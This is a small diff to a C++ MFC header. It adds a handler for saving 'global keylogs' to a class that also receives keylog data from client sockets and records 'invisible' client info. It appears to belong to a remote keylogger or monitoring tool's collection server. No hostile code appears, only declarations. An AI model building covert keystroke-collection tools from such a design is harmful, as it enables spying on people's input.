@@ -44,4 +44,5 @@ public:
 	void SetInvisibleInfo(CClientSocket* pObj, CString internal_ip);
 	void ReceiveKeylog(CClientSocket* pObj, PDUKeylog* pdu);
 	void ClientClose(CClientSocket* pSock);
+	afx_msg void OnBnClickedButtonSaveGlobalKeylogs();
 };
